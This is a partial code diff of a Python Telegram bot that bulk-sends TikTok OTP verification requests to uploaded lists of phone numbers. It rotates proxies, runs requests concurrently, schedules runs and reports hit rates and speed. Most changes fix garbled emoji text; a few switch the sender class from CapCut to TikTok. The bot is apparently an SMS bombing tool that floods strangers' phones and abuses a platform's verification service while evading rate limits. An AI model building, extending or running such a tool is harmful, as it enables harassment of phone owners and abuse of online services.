-        msg += f"   ðŸ“± Numbers: {len(task.phone_numbers):,}\n"
-        msg += f"   ðŸ• Time: {task.scheduled_time.strftime('%I:%M %p PKT')}\n\n"
+        msg += f"🆔 {task.schedule_id}\n"
+        msg += f"   📱 Numbers: {len(task.phone_numbers):,}\n"
+        msg += f"   🕐 Time: {task.scheduled_time.strftime('%I:%M %p PKT')}\n\n"
     
     await update.message.reply_text(msg, parse_mode="HTML")
 
@@ -854,9 +804,9 @@ async def cancelschedule_command(update: Update, context: ContextTypes.DEFAULT_T
     if context.args:
         schedule_id = context.args[0]
         if await task_manager.cancel_scheduled_task(schedule_id):
-            await update.message.reply_text(f"âœ… Scheduled task {schedule_id} cancelled.", parse_mode="HTML")
+            await update.message.reply_text(f"✅ Scheduled task {schedule_id} cancelled.", parse_mode="HTML")
         else:
-            await update.message.reply_text(f"âŒ Scheduled task {schedule_id} not found.", parse_mode="HTML")
+            await update.message.reply_text(f"❌ Scheduled task {schedule_id} not found.", parse_mode="HTML")
     else:
         await update.message.reply_text("Usage: /cancelschedule <schedule_id>", parse_mode="HTML")
 
@@ -867,11 +817,11 @@ async def setnumbers_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
     user_states[user_id]['numbers_buffer'] = []
     
     await update.message.reply_text(
-        "ðŸ“± <b>Set Numbers</b>\n\n"
+        "📱 <b>Set Numbers</b>\n\n"
         "Send phone numbers:\n"
-        "â€¢ One per line OR comma separated\n"
-        "â€¢ Send in multiple messages\n"
-        "â€¢ Send /done when finished",
+        "• One per line OR comma separated\n"
+        "• Send in multiple messages\n"
+        "• Send /done when finished",
         parse_mode="HTML"
     )
 
@@ -882,11 +832,11 @@ async def setproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
     user_states[user_id]['proxies_buffer'] = []
     
     await update.message.reply_text(
-        "ðŸ”’ <b>Set Proxies</b>\n\n"
+        "🔒 <b>Set Proxies</b>\n\n"
         "Send proxies (one per line):\n"
-        "â€¢ ip:port\n"
-        "â€¢ ip:port:user:pass\n"
-        "â€¢ http://user:pass@ip:port\n\n"
+        "• ip:port\n"
+        "• ip:port:user:pass\n"
+        "• http://user:pass@ip:port\n\n"
         "Send /done when finished",
         parse_mode="HTML"
     )
@@ -897,7 +847,7 @@ async def uploadnumbers_command(update: Update, context: ContextTypes.DEFAULT_TY
     user_states[user_id]['awaiting'] = 'file_numbers'
     
     await update.message.reply_text(
-        "ðŸ“ <b>Upload Numbers File</b>\n\n"
+        "📁 <b>Upload Numbers File</b>\n\n"
         "Send a TXT or CSV file containing phone numbers.\n"
         "I'll extract all valid numbers automatically.",
         parse_mode="HTML"
@@ -909,7 +859,7 @@ async def uploadproxies_command(update: Update, context: ContextTypes.DEFAULT_TY
     user_states[user_id]['awaiting'] = 'file_proxies'
     
     await update.message.reply_text(
-        "ðŸ“ <b>Upload Proxies File</b>\n\n"
+        "📁 <b>Upload Proxies File</b>\n\n"
         "Send a TXT file containing proxies.\n"
         "Format: ip:port or ip:port:user:pass",
         parse_mode="HTML"
@@ -920,33 +870,33 @@ async def clearnumbers_command(update: Update, context: ContextTypes.DEFAULT_TYP
     user_id = update.effective_user.id
     user_states[user_id]['numbers'] = []
     user_states[user_id]['numbers_buffer'] = []
-    await update.message.reply_text("âœ… Numbers cleared!", parse_mode="HTML")
+    await update.message.reply_text("✅ Numbers cleared!", parse_mode="HTML")
 
 
 async def clearproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     user_states[user_id]['proxies'] = []
     user_states[user_id]['proxies_buffer'] = []
-    await update.message.reply_text("âœ… Proxies cleared!", parse_mode="HTML")
+    await update.message.reply_text("✅ Proxies cleared!", parse_mode="HTML")
 
 
 async def tasks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     tasks = task_manager.get_all_tasks()
     
     if not tasks:
-        await update.message.reply_text("ðŸ“‹ No tasks.", parse_mode="HTML")
+        await update.message.reply_text("📋 No tasks.", parse_mode="HTML")
         return
     
-    msg = "ðŸ“‹ <b>Tasks:</b>\n\n"
+    msg = "📋 <b>Tasks:</b>\n\n"
     for task in tasks[-10:]:
-        status_emoji = {"pending": "â³", "running": "ðŸ”„", "completed": "âœ…", "cancelled": "âŒ"}.get(task.status, "â“")
+        status_emoji = {"pending": "⏳", "running": "🔄", "completed": "✅", "cancelled": "❌"}.get(task.status, "❓")
         progress = f"{task.current_index}/{len(task.phone_numbers)}"
         elapsed = time.time() - task.start_time
         speed = task.current_index / elapsed if elapsed > 0 else 0
         msg += f"{status_emoji} <b>{task.task_id}</b>\n"
-        msg += f"   ðŸ“Š Progress: {progress}\n"
-        msg += f"   âœ… {task.success_count} | âŒ {task.fail_count}\n"
-        msg += f"   ðŸš€ Speed: {speed:.1f} req/s\n\n"
+        msg += f"   📊 Progress: {progress}\n"
+        msg += f"   ✅ {task.success_count} | ❌ {task.fail_count}\n"
+        msg += f"   🚀 Speed: {speed:.1f} req/s\n\n"
     
     await update.message.reply_text(msg, parse_mode="HTML")
 
@@ -955,9 +905,9 @@ async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if context.args:
         task_id = context.args[0]
         if await task_manager.cancel_task(task_id):
-            await update.message.reply_text(f"âœ… Task {task_id} cancelled.", parse_mode="HTML")
+            await update.message.reply_text(f"✅ Task {task_id} cancelled.", parse_mode="HTML")
         else:
-            await update.message.reply_text(f"âŒ Task {task_id} not found.", parse_mode="HTML")
+            await update.message.reply_text(f"❌ Task {task_id} not found.", parse_mode="HTML")
     else:
         await update.message.reply_text("Usage: /cancel <task_id>", parse_mode="HTML")
 
@@ -971,17 +921,17 @@ async def done_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_states[user_id]['numbers'] = numbers
         user_states[user_id]['awaiting'] = None
         user_states[user_id]['numbers_buffer'] = []
-        await update.message.reply_text(f"âœ… <b>{len(numbers):,} numbers saved!</b>", parse_mode="HTML")
+        await update.message.reply_text(f"✅ <b>{len(numbers):,} numbers saved!</b>", parse_mode="HTML")
     
     elif awaiting == 'proxies':
         proxies = user_states[user_id].get('proxies_buffer', [])
         user_states[user_id]['proxies'] = proxies
         user_states[user_id]['awaiting'] = None
         user_states[user_id]['proxies_buffer'] = []
-        await update.message.reply_text(f"âœ… <b>{len(proxies):,} proxies saved!</b>", parse_mode="HTML")
+        await update.message.reply_text(f"✅ <b>{len(proxies):,} proxies saved!</b>", parse_mode="HTML")
     
     else:
-        await update.message.reply_text("â“ Nothing to finish.", parse_mode="HTML")
+        await update.message.reply_text("❓ Nothing to finish.", parse_mode="HTML")
 
 
 # ============================================
@@ -999,18 +949,18 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         numbers = user_states[user_id].get('numbers', [])
         if not numbers:
             await query.edit_message_text(
-                "âŒ <b>No numbers loaded!</b>\n\n"
+                "❌ <b>No numbers loaded!</b>\n\n"
                 "Use /setnumbers or /uploadnumbers first.",
                 parse_mode="HTML"
             )
         else:
             proxies = user_states[user_id].get('proxies', [])
-            await query.edit_message_text(f"ðŸš€ Starting bulk task with {len(numbers):,} numbers...", parse_mode="HTML")
+            await query.edit_message_text(f"🚀 Starting bulk task with {len(numbers):,} numbers...", parse_mode="HTML")
             await start_bulk_task_from_callback(context, query, numbers, proxies)
     
     elif data == "single":
         await query.edit_message_text(
-            "ðŸ“± <b>Single OTP</b>\n\n"
+            "📱 <b>Single OTP</b>\n\n"
             "Send: <code>/single +923099003842</code>",
             parse_mode="HTML"
         )
@@ -1019,7 +969,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = query.from_user.id
         user_states[user_id]['awaiting'] = 'file_numbers'
         await query.edit_message_text(
-            "ðŸ“ <b>Upload Numbers File</b>\n\n"
+            "📁 <b>Upload Numbers File</b>\n\n"
             "Send a TXT or CSV file.",
             parse_mode="HTML"
         )
@@ -1028,14 +978,14 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = query.from_user.id
         user_states[user_id]['awaiting'] = 'file_proxies'
         await query.edit_message_text(
-            "ðŸ“ <b>Upload Proxies File</b>\n\n"
+            "📁 <b>Upload Proxies File</b>\n\n"
             "Send a TXT file with proxies.",
             parse_mode="HTML"
         )
     
     elif data == "schedule":
         await query.edit_message_text(
-            "â° <b>Schedule Task</b>\n\n"
+            "⏰ <b>Schedule Task</b>\n\n"
             "Use: <code>/schedule HH:MM</code>\n"
             "Example: <code>/schedule 14:30</code>\n\n"
             "Time is in Pakistan timezone (PKT)",
@@ -1047,13 +997,13 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         pending = [s for s in scheduled_tasks if s.status == "pending"]
         
         if not pending:
-            await query.edit_message_text("ðŸ“‹ No scheduled tasks.", parse_mode="HTML")
+            await query.edit_message_text("📋 No scheduled tasks.", parse_mode="HTML")
         else:
-            msg = "â° <b>Scheduled Tasks:</b>\n\n"
+            msg = "⏰ <b>Scheduled Tasks:</b>\n\n"
             for task in pending[-5:]:
-                msg += f"ðŸ†” {task.schedule_id}\n"
-                msg += f"   ðŸ“± Numbers: {len(task.phone_numbers):,}\n"
-                msg += f"   ðŸ• Time: {task.scheduled_time.strftime('%I:%M %p PKT')}\n\n"
+                msg += f"🆔 {task.schedule_id}\n"
+                msg += f"   📱 Numbers: {len(task.phone_numbers):,}\n"
+                msg += f"   🕐 Time: {task.scheduled_time.strftime('%I:%M %p PKT')}\n\n"
             await query.edit_message_text(msg, parse_mode="HTML")
     
     elif data == "status":
@@ -1063,27 +1013,27 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         g_stats = global_stats.get_stats()
         
         await query.edit_message_text(
-            f"ðŸ“Š <b>Status</b>\n\n"
-            f"ðŸ¤– Bot: Online âœ…\n"
-            f"ðŸ“¦ SignerPy: {'âœ…' if SIGNERPY_AVAILABLE else 'âŒ'}\n"
-            f"ðŸ• Time: {pk_time}\n"
-            f"ðŸ“‹ Running: {running}\n"
-            f"ðŸ”¢ IDs Generated: {stats['total_generated']:,}\n\n"
-            f"ðŸ“ˆ <b>Global:</b>\n"
-            f"â€¢ Requests: {g_stats['total_requests']:,}\n"
-            f"â€¢ Success: {g_stats['total_success']:,}\n"
-            f"â€¢ Failed: {g_stats['total_failed']:,}",
+            f"📊 <b>Status</b>\n\n"
+            f"🤖 Bot: Online ✅\n"
+            f"📦 SignerPy: {'✅' if SIGNERPY_AVAILABLE else '❌'}\n"
+            f"🕐 Time: {pk_time}\n"
+            f"📋 Running: {running}\n"
+            f"🔢 IDs Generated: {stats['total_generated']:,}\n\n"
+            f"📈 <b>Global:</b>\n"
+            f"• Requests: {g_stats['total_requests']:,}\n"
+            f"• Success: {g_stats['total_success']:,}\n"
+            f"• Failed: {g_stats['total_failed']:,}",
             parse_mode="HTML"
         )
     
     elif data == "tasks":
         tasks = task_manager.get_all_tasks()
         if not tasks:
-            await query.edit_message_text("ðŸ“‹ No tasks.", parse_mode="HTML")
+            await query.edit_message_text("📋 No tasks.", parse_mode="HTML")
         else:
-            msg = "ðŸ“‹ <b>Tasks:</b>\n\n"
+            msg = "📋 <b>Tasks:</b>\n\n"
             for task in tasks[-5:]:
-                status_emoji = {"pending": "â³", "running": "ðŸ”„", "completed": "âœ…", "cancelled": "âŒ"}.get(task.status, "â“")
+                status_emoji = {"pending": "⏳", "running": "🔄", "completed": "✅", "cancelled": "❌"}.get(task.status, "❓")
                 msg += f"{status_emoji} {task.task_id}: {task.current_index}/{len(task.phone_numbers)}\n"
             await query.edit_message_text(msg, parse_mode="HTML")
     
@@ -1093,13 +1043,13 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         success_rate = (g_stats['total_success'] / g_stats['total_requests'] * 100) if g_stats['total_requests'] > 0 else 0
         
         await query.edit_message_text(
-            f"ðŸ“ˆ <b>Global Statistics</b>\n\n"
-            f"ðŸ”¢ Total Requests: {g_stats['total_requests']:,}\n"
-            f"âœ… Success: {g_stats['total_success']:,}\n"
-            f"âŒ Failed: {g_stats['total_failed']:,}\n"
-            f"ðŸ“Š Success Rate: {success_rate:.1f}%\n\n"
-            f"â± Uptime: {uptime_mins:.1f} min\n"
-            f"ðŸš€ Req/Min: {g_stats['requests_per_minute']:.1f}",
+            f"📈 <b>Global Statistics</b>\n\n"
+            f"🔢 Total Requests: {g_stats['total_requests']:,}\n"
+            f"✅ Success: {g_stats['total_success']:,}\n"
+            f"❌ Failed: {g_stats['total_failed']:,}\n"
+            f"📊 Success Rate: {success_rate:.1f}%\n\n"
+            f"⏱ Uptime: {uptime_mins:.1f} min\n"
+            f"🚀 Req/Min: {g_stats['requests_per_minute']:.1f}",
             parse_mode="HTML"
         )
 
@@ -1122,28 +1072,30 @@ async def process_single_otp(update: Update, context: ContextTypes.DEFAULT_TYPE,
     
     # Use thread pool for blocking operation
     loop = asyncio.get_event_loop()
-    sender = CapCutOTPSender(identity_generator)
+    sender = TikTokOTPSender(identity_generator)
     result = await loop.run_in_executor(thread_pool, sender.send_otp_sync, phone_num, proxy)
     
     await global_stats.increment(result.get("success", False))
     
     if result.get("success"):
-        status = "âœ… SUCCESS"
+        status = "✅ SUCCESS"
         status_detail = result.get("message", "OTP Sent")
     else:
-        status = "âŒ FAILED"
-        error = result.get("data", {}).get("description", result.get("error", "Unknown")) if isinstance(result.get("data"), dict) else result.get("error", "Unknown")
+        status = "❌ FAILED"
+        error = result.get("error", "Unknown")
         status_detail = str(error)[:100]
     
     time_ms = result.get("time_ms", 0)
+    route_info = result.get("route", "Unknown")
     
     msg = f"""
-{'âœ…' if result.get('success') else 'âŒ'} <b>OTP Result</b>
+{'✅' if result.get('success') else '❌'} <b>OTP Result</b>
 
-ðŸ“± Phone: <code>{phone_num}</code>
-ðŸŒ Proxy: {(proxy or 'Direct')[:30]}
-ðŸ“Š Status: {status_detail}
-â± Time: {time_ms:.2f}ms
+📱 Phone: <code>{phone_num}</code>
+🌐 Proxy: {(proxy or 'Direct')[:30]}
+📊 Status: {status_detail}
+🛣 Route: {route_info}
+⏱ Time: {time_ms:.2f}ms
 """
     await update.message.reply_text(msg, parse_mode="HTML")
 
@@ -1156,10 +1108,10 @@ async def start_bulk_task(update: Update, context: ContextTypes.DEFAULT_TYPE, nu
     task_manager.running_tasks.add(task_id)
     
     await update.message.reply_text(
-        f"ðŸš€ <b>Task #{task_id} Started!</b>\n\n"
-        f"ðŸ“± Numbers: {len(numbers):,}\n"
-        f"ðŸ”’ Proxies: {len(proxies):,}\n"
-        f"âš¡ Concurrent: {MAX_CONCURRENT_OTP}\n\n"
+        f"🚀 <b>Task #{task_id} Started!</b>\n\n"
+        f"📱 Numbers: {len(numbers):,}\n"
+        f"🔒 Proxies: {len(proxies):,}\n"
+        f"⚡ Concurrent: {MAX_CONCURRENT_OTP}\n\n"
         f"Use /cancel {task_id} to stop.",
         parse_mode="HTML"
     )
@@ -1177,10 +1129,10 @@ async def start_bulk_task_from_callback(context: ContextTypes.DEFAULT_TYPE, quer
     
     await context.bot.send_message(
         chat_id=chat_id,
-        text=f"ðŸš€ <b>Task #{task_id} Started!</b>\n\n"
-             f"ðŸ“± Numbers: {len(numbers):,}\n"
-             f"ðŸ”’ Proxies: {len(proxies):,}\n"
-             f"âš¡ Concurrent: {MAX_CONCURRENT_OTP}\n\n"
+        text=f"🚀 <b>Task #{task_id} Started!</b>\n\n"
+             f"📱 Numbers: {len(numbers):,}\n"
+             f"🔒 Proxies: {len(proxies):,}\n"
+             f"⚡ Concurrent: {MAX_CONCURRENT_OTP}\n\n"
              f"Use /cancel {task_id} to stop.",
         parse_mode="HTML"
     )
@@ -1219,11 +1171,11 @@ async def run_scheduled_task(context: ContextTypes.DEFAULT_TYPE, schedule_id: st
     
     await context.bot.send_message(
         chat_id=scheduled_task.chat_id,
-        text=f"â° <b>Scheduled Task Starting!</b>\n\n"
-             f"ðŸ†” Schedule: {schedule_id}\n"
-             f"ðŸ†” Task: {task_id}\n"
-             f"ðŸ“± Numbers: {len(scheduled_task.phone_numbers):,}\n"
-             f"ðŸ”’ Proxies: {len(scheduled_task.proxies):,}",
+        text=f"⏰ <b>Scheduled Task Starting!</b>\n\n"
+             f"🆔 Schedule: {schedule_id}\n"
+             f"🆔 Task: {task_id}\n"
+             f"📱 Numbers: {len(scheduled_task.phone_numbers):,}\n"
+             f"🔒 Proxies: {len(scheduled_task.proxies):,}",
         parse_mode="HTML"
     )
     
@@ -1284,22 +1236,22 @@ async def run_bulk_task_concurrent(context: ContextTypes.DEFAULT_TYPE, task: Tas
             g_stats = global_stats.get_stats()
             
             progress_msg = f"""
-ðŸ“Š <b>Task #{task.task_id} Progress</b>
+📊 <b>Task #{task.task_id} Progress</b>
 
-ðŸ“ˆ Progress: {task.current_index}/{len(task.phone_numbers)}
-âœ… Total Success: {task.success_count}
-âŒ Total Failed: {task.fail_count}
+📈 Progress: {task.current_index}/{len(task.phone_numbers)}
+✅ Total Success: {task.success_count}
+❌ Total Failed: {task.fail_count}
 
-ðŸ“‹ <b>Last {len(recent_results)} Requests:</b>
-âœ… Success: {recent_success} | âŒ Failed: {recent_failed}
+📋 <b>Last {len(recent_results)} Requests:</b>
+✅ Success: {recent_success} | ❌ Failed: {recent_failed}
 
-ðŸš€ Speed: {speed:.1f} req/s
-â± Elapsed: {elapsed:.1f}s
+🚀 Speed: {speed:.1f} req/s
+⏱ Elapsed: {elapsed:.1f}s
 
-ðŸ“ˆ <b>Global Hits:</b>
-â€¢ Total: {g_stats['total_requests']:,}
-â€¢ Success: {g_stats['total_success']:,}
-â€¢ Failed: {g_stats['total_failed']:,}
+📈 <b>Global Hits:</b>
+• Total: {g_stats['total_requests']:,}
+• Success: {g_stats['total_success']:,}
+• Failed: {g_stats['total_failed']:,}
 """
             await send_message_safe(context, task.chat_id, progress_msg, parse_mode="HTML")
     
@@ -1313,20 +1265,20 @@ async def run_bulk_task_concurrent(context: ContextTypes.DEFAULT_TYPE, task: Tas
     g_stats = global_stats.get_stats()
     
     final_msg = f"""
-ðŸ <b>Task #{task.task_id} Complete!</b>
+🏁 <b>Task #{task.task_id} Complete!</b>
 
-ðŸ“Š Total: {len(task.phone_numbers)}
-âœ… Success: {task.success_count}
-âŒ Failed: {task.fail_count}
-ðŸ“ˆ Success Rate: {rate:.1f}%
+📊 Total: {len(task.phone_numbers)}
+✅ Success: {task.success_count}
+❌ Failed: {task.fail_count}
+📈 Success Rate: {rate:.1f}%
 
-â± Total Time: {elapsed:.1f}s
-ðŸš€ Average Speed: {speed:.1f} req/s
+⏱ Total Time: {elapsed:.1f}s
+🚀 Average Speed: {speed:.1f} req/s
 
-ðŸ“ˆ <b>Global Hits:</b>
-â€¢ Total Requests: {g_stats['total_requests']:,}
-â€¢ Total Success: {g_stats['total_success']:,}
-â€¢ Total Failed: {g_stats['total_failed']:,}
+📈 <b>Global Hits:</b>
+• Total Requests: {g_stats['total_requests']:,}
+• Total Success: {g_stats['total_success']:,}
+• Total Failed: {g_stats['total_failed']:,}
 """
     await send_message_safe(context, task.chat_id, final_msg, parse_mode="HTML")
 
@@ -1350,7 +1302,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user_states[user_id]['numbers_buffer'] = []
         user_states[user_id]['numbers_buffer'].extend(new_numbers)
         count = len(user_states[user_id]['numbers_buffer'])
-        await update.message.reply_text(f"ðŸ“¥ +{len(new_numbers):,} numbers (Total: {count:,})\nSend more or /done", parse_mode="HTML")
+        await update.message.reply_text(f"📥 +{len(new_numbers):,} numbers (Total: {count:,})\nSend more or /done", parse_mode="HTML")
     
     elif awaiting == 'proxies':
         new_proxies = parse_proxies(text)
@@ -1358,7 +1310,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user_states[user_id]['proxies_buffer'] = []
         user_states[user_id]['proxies_buffer'].extend(new_proxies)
         count = len(user_states[user_id]['proxies_buffer'])
-        await update.message.reply_text(f"ðŸ“¥ +{len(new_proxies):,} proxies (Total: {count:,})\nSend more or /done", parse_mode="HTML")
+        await update.message.reply_text(f"📥 +{len(new_proxies):,} proxies (Total: {count:,})\nSend more or /done", parse_mode="HTML")
     
     elif awaiting == 'single_phone':
         user_states[user_id]['awaiting'] = None
@@ -1393,9 +1345,9 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_states[user_id]['awaiting'] = None
         
         await update.message.reply_text(
-            f"âœ… <b>Numbers Loaded!</b>\n\n"
-            f"ðŸ“Š Extracted: {len(numbers):,} unique numbers\n"
-            f"ðŸ“ File: {document.file_name}",
+            f"✅ <b>Numbers Loaded!</b>\n\n"
+            f"📊 Extracted: {len(numbers):,} unique numbers\n"
+            f"📁 File: {document.file_name}",
             parse_mode="HTML"
         )
     
@@ -1405,9 +1357,9 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_states[user_id]['awaiting'] = None
         
         await update.message.reply_text(
-            f"âœ… <b>Proxies Loaded!</b>\n\n"
-            f"ðŸ“Š Loaded: {len(proxies):,} proxies\n"
-            f"ðŸ“ File: {document.file_name}",
+            f"✅ <b>Proxies Loaded!</b>\n\n"
+            f"📊 Loaded: {len(proxies):,} proxies\n"
+            f"📁 File: {document.file_name}",
             parse_mode="HTML"
         )
 
@@ -1460,10 +1412,10 @@ def main():
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     
-    logger.info("ðŸš€ Ultra Fast Bot v6.1 starting...")
-    logger.info(f"âš¡ Max Concurrent OTP: {MAX_CONCURRENT_OTP}")
-    logger.info(f"ðŸ“Š Log Interval: Every {LOG_INTERVAL} requests")
-    logger.info(f"â° Schedule Feature: Enabled")
+    logger.info("🚀 TikTok Ultra Fast Bot v6.1 starting...")
+    logger.info(f"⚡ Max Concurrent OTP: {MAX_CONCURRENT_OTP}")
+    logger.info(f"📊 Log Interval: Every {LOG_INTERVAL} requests")
+    logger.info(f"⏰ Schedule Feature: Enabled")
     
     application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
 
